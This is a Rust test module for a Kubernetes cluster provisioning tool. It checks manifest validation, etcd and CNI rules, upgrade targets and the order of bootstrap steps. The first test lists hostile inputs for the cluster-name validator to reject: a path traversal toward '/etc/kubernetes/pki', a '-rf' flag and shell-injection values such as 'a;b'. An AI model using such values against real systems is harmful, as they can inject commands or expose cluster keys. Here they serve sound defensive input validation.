    #[test]
    fn cluster_name_rejects_path_traversal_and_shell() {
        for bad in [
            "../../../etc/kubernetes/pki",
            "a/b",
            "..",
            "a..b",
            ".hidden",
            "-rf",
            "",
            "a b",
            "a;b",
            "a\nb",
        ] {
            assert!(!valid_cluster_name(bad), "{bad:?}");
        }
        assert!(!valid_cluster_name(&"a".repeat(64)));
        for ok in ["prod", "njinga-benguela-07", "lab_1", "eu.west-1"] {
            assert!(valid_cluster_name(ok), "{ok:?}");
        }
        assert!(check_cluster_name("../x").is_err());
    }

    fn etcd_host(ip: &str) -> HostSpec {
        HostSpec {
            ip: ip.into(),
            hostname: None,
        }
    }

    #[test]
    fn validate_recusa_etcd_external_sem_hosts() {
        let spec = ClusterSpec {
            etcd: EtcdSpec {
                mode: "external".into(),
                hosts: vec![],
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("etcd.hosts"));
    }

    #[test]
    fn validate_recusa_etcd_external_numero_par_de_hosts() {
        let spec = ClusterSpec {
            etcd: EtcdSpec {
                mode: "external".into(),
                hosts: vec![etcd_host("10.0.1.1"), etcd_host("10.0.1.2")],
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("ODD"));
    }

    #[test]
    fn validate_aceita_etcd_external_1_host() {
        let spec = ClusterSpec {
            etcd: EtcdSpec {
                mode: "external".into(),
                hosts: vec![etcd_host("10.0.1.1")],
            },
            ..spec_ssh_1cp()
        };
        assert!(validate(&spec).is_ok());
    }

    #[test]
    fn validate_aceita_etcd_external_3_hosts() {
        let spec = ClusterSpec {
            etcd: EtcdSpec {
                mode: "external".into(),
                hosts: vec![
                    etcd_host("10.0.1.1"),
                    etcd_host("10.0.1.2"),
                    etcd_host("10.0.1.3"),
                ],
            },
            ..spec_ssh_1cp()
        };
        assert!(validate(&spec).is_ok());
    }

    #[test]
    fn validate_recusa_etcd_mode_desconhecido() {
        let spec = ClusterSpec {
            etcd: EtcdSpec {
                mode: "esquisito".into(),
                hosts: vec![],
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("stacked"));
        assert!(format!("{err}").contains("external"));
    }

    #[test]
    fn validate_recusa_etcd_external_fora_de_mode_ssh() {
        let spec = ClusterSpec {
            mode: "vm".into(),
            control_plane: NodesSpec {
                replicas: Some(1),
                hosts: vec![],
            },
            etcd: EtcdSpec {
                mode: "external".into(),
                hosts: vec![etcd_host("10.0.1.1")],
            },
            ..Default::default()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("mode 'ssh'") || format!("{err}").contains("mode: ssh"));
    }

    #[test]
    fn validate_exige_endpoint_com_multiplos_control_planes() {
        let spec = ClusterSpec {
            control_plane: NodesSpec {
                replicas: None,
                hosts: vec![
                    HostSpec {
                        ip: "10.0.0.1".into(),
                        hostname: None,
                    },
                    HostSpec {
                        ip: "10.0.0.2".into(),
                        hostname: None,
                    },
                ],
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_aceita_1_control_plane_sem_endpoint() {
        assert!(validate(&spec_ssh_1cp()).is_ok());
    }

    #[test]
    fn validate_recusa_control_plane_vazio() {
        let spec = ClusterSpec {
            control_plane: NodesSpec::default(),
            ..spec_ssh_1cp()
        };
        assert!(validate(&spec).is_err());
    }

    #[test]
    fn cluster_spec_desserializa_de_yaml_completo() {
        let yaml = "\
mode: ssh
ssh: { user: delonix, key: /home/delonix/.ssh/id_ed25519 }
etcd: { mode: stacked }
controlPlaneEndpoint: lb.exemplo.com
controlPlane:
  hosts:
    - { ip: 10.0.0.10, hostname: cp1 }
    - { ip: 10.0.0.11, hostname: cp2 }
workers:
  hosts:
    - { ip: 10.0.0.20, hostname: w1 }
k8sVersion: \"1.31\"
";
        let spec: ClusterSpec = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(spec.control_plane.hosts.len(), 2);
        assert_eq!(spec.workers.hosts.len(), 1);
        assert_eq!(
            spec.control_plane_endpoint.as_deref(),
            Some("lb.exemplo.com")
        );
        assert_eq!(spec.pod_subnet, default_pod_subnet());
    }

    /// The manual `Default` of `ClusterSpec` has to be indistinguishable from an
    /// empty manifest — if it diverges, the tests above start exercising a
    /// spec the parser would never produce.
    #[test]
    fn cluster_spec_default_igual_ao_yaml_vazio() {
        let spec: ClusterSpec = serde_yaml::from_str("{}").unwrap();
        let def = ClusterSpec::default();
        assert_eq!(spec.mode, def.mode);
        assert_eq!(spec.ssh.user, def.ssh.user);
        assert_eq!(spec.etcd.mode, def.etcd.mode);
        assert_eq!(spec.etcd.hosts.len(), def.etcd.hosts.len());
        assert_eq!(spec.pod_subnet, def.pod_subnet);
        assert_eq!(spec.service_subnet, def.service_subnet);
        assert_eq!(spec.cni, def.cni);
        assert_eq!(spec.kind.image, def.kind.image);
    }

    /// A manifest WITHOUT an `ssh:` block has to end up with the canonical user
    /// (`delonix`), not the empty string — regression of the derived `Default`.
    #[test]
    fn ssh_user_cai_no_default_quando_o_bloco_ssh_e_omitido() {
        let spec: ClusterSpec = serde_yaml::from_str("mode: ssh").unwrap();
        assert_eq!(spec.ssh.user, "delonix");
    }

    fn upgrade_test_spec() -> ClusterSpec {
        serde_yaml::from_str(
            "\
mode: ssh
controlPlaneEndpoint: lb.example.com
controlPlane:
  hosts:
    - { ip: 10.0.0.10, hostname: cp1 }
    - { ip: 10.0.0.11, hostname: cp2 }
workers:
  hosts:
    - { ip: 10.0.0.20, hostname: w1 }
",
        )
        .unwrap()
    }

    /// `--node <leader>` is refused — the leader runs `kubeadm upgrade apply`
    /// (no `--node` at all), never `kubeadm upgrade node`. Silently accepting
    /// it would run the wrong verb against the right host.
    #[test]
    fn find_upgrade_target_refuses_the_leader() {
        let spec = upgrade_test_spec();
        let err = find_upgrade_target(&spec, "cp1").unwrap_err().to_string();
        assert!(err.contains("cp1"), "{err}");
        assert!(err.contains("omit --node"), "{err}");
    }

    /// The other control-plane and every worker ARE valid `--node` targets.
    #[test]
    fn find_upgrade_target_finds_another_control_plane_and_workers() {
        let spec = upgrade_test_spec();
        assert_eq!(find_upgrade_target(&spec, "cp2").unwrap().ip, "10.0.0.11");
        assert_eq!(find_upgrade_target(&spec, "w1").unwrap().ip, "10.0.0.20");
    }

    /// A name that matches nothing gets a clear error naming what DOES exist
    /// — never a bare "not found" that sends the reader guessing.
    #[test]
    fn find_upgrade_target_lists_the_available_names_when_it_fails() {
        let spec = upgrade_test_spec();
        let err = find_upgrade_target(&spec, "ghost").unwrap_err().to_string();
        assert!(err.contains("cp2"), "{err}");
        assert!(err.contains("w1"), "{err}");
    }

    fn cluster_doc(name: &str) -> ManifestDoc {
        serde_yaml::from_str(&format!(
            "apiVersion: delonix.io/v1\nkind: KubernetesCluster\nmetadata: {{ name: {name} }}\nspec: {{ mode: ssh }}\n"
        ))
        .unwrap()
    }

    #[test]
    fn single_cluster_doc_refuses_zero_or_several() {
        assert!(single_cluster_doc(&[]).is_err());
        let docs = vec![cluster_doc("a"), cluster_doc("b")];
        let err = single_cluster_doc(&docs).unwrap_err().to_string();
        assert!(err.contains("one cluster at a time"), "{err}");
    }

    #[test]
    fn single_cluster_doc_accepts_exactly_one() {
        let docs = vec![cluster_doc("only")];
        let (doc, _spec) = single_cluster_doc(&docs).unwrap();
        assert_eq!(doc.metadata.name, "only");
    }

    // --- #799: the pod network of a multi-node kubeadm cluster ---------------

    fn host(ip: &str) -> HostSpec {
        HostSpec {
            ip: ip.into(),
            hostname: None,
        }
    }

    /// One control-plane and one worker over SSH, with the given `cni`.
    fn spec_ssh_cp_and_worker(cni: &str) -> ClusterSpec {
        ClusterSpec {
            workers: NodesSpec {
                replicas: None,
                hosts: vec![host("10.0.0.2")],
            },
            cni: cni.into(),
            ..spec_ssh_1cp()
        }
    }

    /// The measured failure of #799: two nodes, `cni: default`, every node
    /// `NotReady` after a bootstrap that said «ready». Refused now, with its
    /// own number and the «unavailable» exit class (69), not a generic 1.
    #[test]
    fn a_multi_node_kubeadm_cluster_refuses_the_default_cni() {
        let err = validate(&spec_ssh_cp_and_worker("default")).unwrap_err();
        assert_eq!(err.number(), 6701, "{err}");
        assert_eq!(super::super::exitcode::for_error(&err), 69, "{err}");
        let msg = err.to_string();
        assert!(
            msg.contains("--cni none"),
            "the refusal names the way out: {msg}"
        );
        assert!(msg.contains("2 nodes"), "{msg}");
    }

    /// `mode: vm` counts REPLICAS, not hosts: the manifest path of
    /// `cluster apply -f cluster-vm.yaml` is refused before `apply_vm`
    /// creates its first VM.
    #[test]
    fn a_vm_mode_cluster_counts_replicas_for_the_cni_refusal() {
        let spec = ClusterSpec {
            mode: "vm".into(),
            control_plane: NodesSpec {
                replicas: Some(1),
                hosts: vec![],
            },
            workers: NodesSpec {
                replicas: Some(2),
                hosts: vec![],
            },
            ..Default::default()
        };
        assert_eq!(validate(&spec).unwrap_err().number(), 6701);
        let one = ClusterSpec {
            workers: NodesSpec::default(),
            ..spec
        };
        assert!(validate(&one).is_ok(), "one node keeps the default bridge");
    }

    /// REGRESSION, found live with 3 VMs cloned from `k8s-golden`: the image
    /// shipped a non-empty `/etc/machine-id`, every clone derived the same
    /// systemd DHCP client identifier from it, and dnsmasq — which keys leases
    /// by that identifier — gave three distinct MACs ONE migrating lease. All
    /// three nodes resolved to 192.168.122.176, so host prep opened three
    /// sessions to one machine and they raced on the shared remote temp paths,
    /// surfacing as `mv: cannot stat '/tmp/delonix-cri'`. The refusal has to
    /// come first, and has to name the cause.
    #[test]
    fn nodes_sharing_one_address_are_refused_naming_the_cause() {
        let shared = "192.168.122.176";
        let err = check_distinct_node_addresses(&[
            ("lab-cp1", shared),
            ("lab-w1", shared),
            ("lab-w2", shared),
        ])
        .unwrap_err();

        assert_eq!(err.number(), 6702, "{err}");
        let msg = err.to_string();
        // The three colliding nodes and the address are all named: the operator
        // must not have to guess WHICH hosts collided.
        for node in ["lab-cp1", "lab-w1", "lab-w2", shared] {
            assert!(msg.contains(node), "{node} missing from: {msg}");
        }
        // ...and so is the real cause, instead of the downstream `mv` noise.
        assert!(
            msg.contains("/etc/machine-id"),
            "the diagnostic must name the baked-in identity: {msg}"
        );
    }

    #[test]
    fn nodes_with_distinct_addresses_are_accepted() {
        assert!(check_distinct_node_addresses(&[
            ("lab-cp1", "192.168.122.10"),
            ("lab-w1", "192.168.122.11"),
            ("lab-w2", "192.168.122.12"),
        ])
        .is_ok());
        // A one-node cluster, and the empty case, cannot collide.
        assert!(check_distinct_node_addresses(&[("solo", "192.168.122.10")]).is_ok());
        assert!(check_distinct_node_addresses(&[]).is_ok());
    }

    /// Only the colliding group is reported — a cluster where two of five
    /// nodes share a lease must not drag the three healthy ones into the
    /// message, or the operator cannot tell which machines to look at.
    #[test]
    fn only_the_colliding_group_reaches_the_diagnostic() {
        let err = check_distinct_node_addresses(&[
            ("lab-cp1", "192.168.122.10"),
            ("lab-w1", "192.168.122.176"),
            ("lab-w2", "192.168.122.176"),
            ("lab-etcd1", "192.168.122.12"),
        ])
        .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("lab-w1") && msg.contains("lab-w2"), "{msg}");
        assert!(
            !msg.contains("lab-cp1") && !msg.contains("lab-etcd1"),
            "healthy nodes must stay out of the message: {msg}"
        );
    }

    /// `none` is the operator saying they bring their own CNI: accepted at any
    /// size, and the bootstrap neither installs one nor waits for `Ready`.
    #[test]
    fn cni_none_is_accepted_for_any_size_and_never_waited_on() {
        let spec = spec_ssh_cp_and_worker("none");
        assert!(validate(&spec).is_ok());
        assert!(!installs_default_cni(&spec));
        assert!(!waits_for_ready(&spec, true));
        let plan = bootstrap_plan(&spec, true);
        let waiting = super::super::po::t("Waiting for all nodes to be Ready");
        let installing = super::super::po::t("Installing the default CNI (bridge, single node)");
        assert!(!plan.iter().any(|l| l == waiting), "{plan:?}");
        assert!(!plan.iter().any(|l| l == installing), "{plan:?}");
    }

    /// Kind mode is not refused: there `default` is kindnet, which routes
    /// between nodes.
    #[test]
    fn kind_mode_keeps_the_default_cni_with_several_nodes() {
        let spec = ClusterSpec {
            mode: "kind".into(),
            control_plane: NodesSpec {
                replicas: Some(1),
                hosts: vec![],
            },
            workers: NodesSpec {
                replicas: Some(3),
                hosts: vec![],
            },
            ..Default::default()
        };
        assert!(validate(&spec).is_ok());
    }

    /// REGRESSION, found by the first real two-node run: the engine passed
    /// `--kubernetes-version=v{spec.k8sVersion}` verbatim, kubeadm demands a
    /// full semver there, and every shipped example uses major.minor — so
    /// every documented invocation of this path died at `kubeadm init`, after
    /// the VMs existed and the hosts were prepared.
    #[test]
    fn a_minor_k8s_version_is_not_passed_to_kubeadm_as_a_version() {
        // The shape that broke it. kubeadm answers «"v1.34" doesn't match
        // patterns for neither semantic version nor labels».
        assert_eq!(kubeadm_version_arg(Some("1.34")), None);
        assert_eq!(kubeadm_version_arg(Some("1.36")), None);
        // Omitted, not faked to `.0`: measured on the golden this was found
        // with, the installed kubeadm is 1.34.12 and `preseed_k8s_images`
        // cached v1.34.12 images. Asking for v1.34.0 would make kubeadm want
        // images the node does not have.
        assert_ne!(kubeadm_version_arg(Some("1.34")), Some("v1.34.0".into()));
        // A full semver is the operator pinning a patch, and travels through.
        assert_eq!(
            kubeadm_version_arg(Some("1.34.12")),
            Some("v1.34.12".into())
        );
        assert_eq!(kubeadm_version_arg(None), None);
    }

    /// One resolver, two consumers, opposite shapes — the invariant #848 left
    /// implicit. The apt repo path only exists at minor level, so it truncates;
    /// kubeadm demands a full semver, so it keeps one; and when the operator
    /// pinned nothing, kubeadm is told nothing rather than handed the engine's
    /// default. Asserting the two directions together is what keeps a future
    /// change from "fixing" one of them back into the other's bug.
    #[test]
    fn the_resolver_still_owns_the_repo_path_while_kubeadm_opts_out() {
        use super::super::k8s_recipes::{k8s_repo_version, resolve_k8s_version};
        // No version asked: the repo gets the engine's default, concrete.
        let resolved = resolve_k8s_version(None);
        assert_eq!(
            k8s_repo_version(&resolved),
            format!("stable:/v{}", super::super::vmimage::DEFAULT_K8S_VERSION)
        );
        // …and kubeadm gets nothing, so it uses the version the golden
        // installed instead of a number the engine invented for it.
        assert_eq!(kubeadm_version_arg(None), None);
        // A patch version: the repo truncates (it only exists at minor level),
        // kubeadm keeps it whole. Same input, opposite shapes, one resolver.
        assert_eq!(k8s_repo_version("1.34.12"), "stable:/v1.34");
        assert_eq!(
            kubeadm_version_arg(Some("1.34.12")),
            Some("v1.34.12".into())
        );
    }

    /// The generated `--config` carried the identical bug, because it took the
    /// raw `spec.k8sVersion` and prepended `v` itself.
    #[test]
    fn the_generated_kubeadm_config_uses_the_same_resolution() {
        let etcd = ["https://10.0.1.1:2379".to_string()];
        let resolved = kubeadm_version_arg(Some("1.34"));
        let yaml = kubeadm_config::render_init_config(&kubeadm_config::InitConfig {
            k8s_version: resolved.as_deref(),
            control_plane_endpoint: "10.0.0.1:6443",
            pod_subnet: "10.244.0.0/16",
            service_subnet: "10.96.0.0/12",
            cri_socket: DELONIX_CRI_SOCKET,
            etcd_endpoints: &etcd,
            kube_proxy: "iptables",
        })
        .expect("a config for external etcd");
        // No `kubernetesVersion` at all, rather than an invalid one.
        assert!(!yaml.contains("kubernetesVersion"), "{yaml}");
        assert!(!yaml.contains("v1.34\n"), "{yaml}");
    }

    /// A CNI the engine does not know used to install nothing and say nothing.
    ///
    /// This test used to use `"calico"` as the unknown value — `calico` is now
    /// a profile this engine installs, so the test would have kept passing for
    /// the WRONG reason (it was asserting the code, and `calico` now gets a
    /// different, also-refusing code). The unknown value has to be one that is
    /// genuinely unknown.
    #[test]
    fn an_unknown_cni_is_refused_by_name() {
        let spec = ClusterSpec {
            cni: "weave".into(),
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert_eq!(err.number(), 1701, "{err}");
        assert!(err.to_string().contains("weave"), "{err}");
        // And it lists the ones that DO exist, rather than only saying no.
        for p in ["cilium", "calico", "flannel", "none"] {
            assert!(err.to_string().contains(p), "{p} not offered: {err}");
        }
    }

    /// A profile this release has not measured end to end is refused unless
    /// the manifest says so by name. The whole-spec path is tested here (the
    /// per-field logic has its own tests in `cmd::net_profiles`), because this
    /// is the path a real manifest takes.
    #[test]
    fn an_experimental_profile_is_refused_through_the_manifest_path() {
        let spec = ClusterSpec {
            cni: "cilium".into(),
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert_eq!(err.number(), 1705, "{err}");
        // With the opt-in, the same manifest resolves.
        let ok = ClusterSpec {
            cni: "cilium".into(),
            network: NetworkBlock {
                experimental: true,
                ..Default::default()
            },
            ..spec_ssh_1cp()
        };
        assert!(validate(&ok).is_ok(), "{:?}", validate(&ok).err());
    }

    /// `spec.network` is only read by a profile that reads it. A knob left on
    /// `cni: none` would be dropped in silence, and a dropped network setting
    /// is indistinguishable from an honoured one until the traffic fails.
    #[test]
    fn a_network_knob_on_a_profileless_cluster_is_refused() {
        let spec = ClusterSpec {
            cni: "none".into(),
            network: NetworkBlock {
                mtu: Some(1400),
                ..Default::default()
            },
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert_eq!(err.number(), 1702, "{err}");
        assert!(err.to_string().contains("mtu"), "{err}");
    }

    /// The schema's `enum` and the code's list cannot drift. A hardcoded
    /// literal in the `#[schemars]` attribute is the only way to express it
    /// (the attribute takes no expressions), so this is what keeps it true.
    #[test]
    fn the_published_schema_offers_the_same_cni_values_as_the_code() {
        let schema = serde_json::to_value(schemars::schema_for!(ClusterSpec)).unwrap();
        let from_schema = schema["properties"]["cni"]["enum"]
            .as_array()
            .expect("spec.cni has to carry an enum, or an editor validates a typo as fine")
            .iter()
            .map(|v| v.as_str().unwrap().to_string())
            .collect::<Vec<_>>();
        assert_eq!(from_schema, CNI_CHOICES.to_vec());
    }

    /// The `spec.network` field list and the struct cannot drift: a field in
    /// the struct and not the allowlist is warned about as "unknown" in every
    /// manifest that sets it, and a field in the allowlist and not the struct
    /// is accepted and then ignored.
    #[test]
    fn net_profiles_block_fields_match_the_struct() {
        // The struct's serde names with a value each type accepts. There is
        // no reflection for this, so the list IS the test — and every entry
        // is deserialized, because a rename typo in the struct would make the
        // field silently inert while still appearing in the allowlist.
        let from_struct = [
            ("dataplane", "vxlan"),
            ("kubeProxy", "ipvs"),
            ("mtu", "1400"),
            ("nodeMtu", "1500"),
            ("ipFamily", "ipv4"),
            ("interface", "eth0"),
            ("multus", "true"),
            ("hubble", "true"),
            ("experimental", "true"),
            ("offline", "true"),
        ];
        let mut a: Vec<&str> = from_struct.iter().map(|(k, _)| *k).collect();
        let mut b: Vec<&str> = CLUSTER_NETWORK_FIELDS.to_vec();
        a.sort_unstable();
        b.sort_unstable();
        assert_eq!(a, b);
        for (f, v) in from_struct {
            let block: NetworkBlock = serde_yaml::from_str(&format!("{f}: {v}"))
                .unwrap_or_else(|e| panic!("{f}: {v} did not deserialize: {e}"));
            // And it actually LANDED — a field that parses into the default
            // is a field that does nothing.
            let json = serde_json::to_value(
                serde_yaml::from_str::<serde_yaml::Value>(&format!("{f}: {v}")).unwrap(),
            )
            .unwrap();
            assert!(json.get(f).is_some(), "{f}");
            let _ = block;
        }
        // The one that matters most, checked by value rather than by parse:
        // `kubeProxy` is renamed, so a serde typo there is invisible to a
        // round-trip that only asserts "it parsed".
        let b: NetworkBlock = serde_yaml::from_str("kubeProxy: ipvs\nnodeMtu: 9000").unwrap();
        assert_eq!(b.kube_proxy.as_deref(), Some("ipvs"));
        assert_eq!(b.node_mtu, Some(9000));
    }

    /// The plan of a one-node default-CNI cluster announces the CNI step, and
    /// the wait only when it is asked for: the line the old plan printed
    /// unconditionally, for a step that never ran without `--copy-kubeconfig`.
    #[test]
    fn the_plan_announces_only_the_steps_that_run() {
        let spec = spec_ssh_1cp();
        let waiting = super::super::po::t("Waiting for all nodes to be Ready");
        let installing = super::super::po::t("Installing the default CNI (bridge, single node)");
        let with_wait = bootstrap_plan(&spec, true);
        assert!(with_wait.iter().any(|l| l == installing), "{with_wait:?}");
        assert!(with_wait.iter().any(|l| l == waiting), "{with_wait:?}");
        let without = bootstrap_plan(&spec, false);
        assert!(!without.iter().any(|l| l == waiting), "{without:?}");
    }

    /// DX-6704 tells the operator to look with `delonix cluster <name> -n
    /// <ns> describe daemonset <ds>`, and that passthrough resolves the
    /// CACHED kubeconfig. Fetched at the END of the bootstrap — after the
    /// pod-network install and after the readiness wait — the file does not
    /// exist yet at the moment the error is printed, so the advice answered
    /// DX-1000 «no kubeconfig for cluster» instead. Measured 2026-10-20 on a
    /// 3-control-plane + 2-worker flannel cluster: DX-6704 after 420s, and
    /// the cluster directory held only the two SSH keys and
    /// `network-profile.json`.
    ///
    /// So the order is the contract, not an accident of where the push sits:
    /// the kubeconfig is announced (and fetched) BEFORE anything that can
    /// fail with advice that needs it.
    #[test]
    fn the_kubeconfig_is_fetched_before_anything_that_can_fail_needing_it() {
        let spec = ClusterSpec {
            network: NetworkBlock {
                experimental: true,
                ..Default::default()
            },
            ..spec_ssh_cp_and_worker("flannel")
        };
        let plan = bootstrap_plan(&spec, true);
        let at = |needle: &str| {
            plan.iter()
                .position(|l| l == needle)
                .unwrap_or_else(|| panic!("{needle:?} is not in the plan: {plan:?}"))
        };
        let fetching = at(super::super::po::t("Fetching kubeconfig"));
        let init = at(super::super::po::t(
            "Bootstrapping control-plane (kubeadm init)",
        ));
        let installing = at(&super::super::po::tf(
            "Installing the {cni} pod network",
            &[("cni", "flannel")],
        ));
        let waiting = at(super::super::po::t("Waiting for all nodes to be Ready"));
        // After the init, because `admin.conf` does not exist before it.
        assert!(init < fetching, "{plan:?}");
        // Before the two steps whose failures name it.
        assert!(fetching < installing, "{plan:?}");
        assert!(fetching < waiting, "{plan:?}");
    }
}
